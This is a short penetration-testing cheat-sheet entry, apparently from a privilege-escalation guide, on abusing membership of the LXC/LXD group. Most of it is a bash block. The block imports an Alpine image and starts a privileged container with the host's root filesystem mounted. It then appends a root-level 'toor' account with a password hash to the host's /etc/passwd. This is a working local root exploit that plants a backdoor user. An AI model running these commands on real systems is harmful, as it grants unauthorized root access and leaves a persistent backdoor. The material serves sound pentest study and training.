## LXC/LXD Group

The **LXC/LXD** group controls access to and management of containers and the container daemon, respectively. It is a virtualization system similar to Docker, designed to provide a lightweight and isolated environment for running applications and services.

## Attack

Similar to Docker, an attacker could create a container where the entire host filesystem can be mounted. They could then access the original filesystem with root permissions to escalate privileges, for example, by creating a root user in the `passwd` file.

A common technique for privilege escalation would involve using the following container **`alpine-v3.13-x86_64-20210218_0139.tar.gz`**.

```bash
lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh 
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/root/etc/passwd
```
